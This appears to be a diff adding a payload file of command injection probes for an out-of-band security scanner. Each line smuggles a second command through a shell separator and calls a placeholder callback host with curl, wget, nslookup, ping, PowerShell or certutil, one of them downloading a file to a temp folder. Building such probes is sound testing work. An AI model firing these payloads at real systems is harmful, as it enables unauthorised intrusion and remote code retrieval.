@@ -1,0 +1,11 @@
+# Gated command injection OOB probes
+;curl http://{callback_host}/cmdi
+|curl http://{callback_host}/cmdi
+&& curl http://{callback_host}/cmdi
+$(curl http://{callback_host}/cmdi)
+`curl http://{callback_host}/cmdi`
+;wget -qO- http://{callback_host}/cmdi
+;nslookup cmdi.{callback_host}
+| ping -c 1 {callback_host}
+& powershell -c iwr http://{callback_host}/cmdi
+& certutil -urlcache -split -f http://{callback_host}/cmdi %TEMP%\z
